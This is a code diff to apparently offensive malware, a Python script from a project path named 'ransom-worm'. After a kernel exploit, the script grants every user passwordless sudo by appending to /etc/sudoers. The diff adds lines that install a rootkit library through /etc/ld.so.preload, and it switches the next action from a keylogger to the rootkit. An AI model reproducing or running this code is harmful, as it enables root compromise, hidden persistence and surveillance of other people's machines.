@@ -94,6 +94,15 @@ def run_exploit(exploit):
             run_command(
                 process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
             )
+            run_command(process, "touch /etc/ld.so.preload \n")
+            # run_command(
+            #     process,
+            #     "gcc -fPIC -shared -o ./utils/rootkit.so ./utils/rootkit.c -ldl \n",
+            # )
+            run_command(
+                process,
+                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
+            )
             run_command(process, 'echo "exit" \n')
 
             # read output
@@ -177,7 +186,7 @@ def run():
         # - kernel version
         if exploit_kernel():
             print("kernel exploited")
-            next_action = "keylogger"
+            next_action = "rootkit"
         else:
             print("no kernel exploit available")
             # test something else
